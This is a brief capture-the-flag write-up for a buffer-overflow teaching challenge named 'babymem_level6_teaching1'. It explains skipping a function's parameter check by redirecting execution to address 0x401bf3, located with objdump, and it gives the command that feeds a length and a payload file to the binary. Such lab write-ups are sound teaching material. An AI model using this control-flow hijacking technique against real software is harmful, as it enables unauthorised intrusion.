In this challenge, there is a check for function parameter.

We can evade this by jumping to right after the check.

Specifically, with `objdump`, find the address right after the compare and jump instruction.

In this case, the address is `0x401bf3`.

You can use the following command to get the flag.

```
./run.py
(echo "112"; cat payload) | /babymem_level6_teaching1
```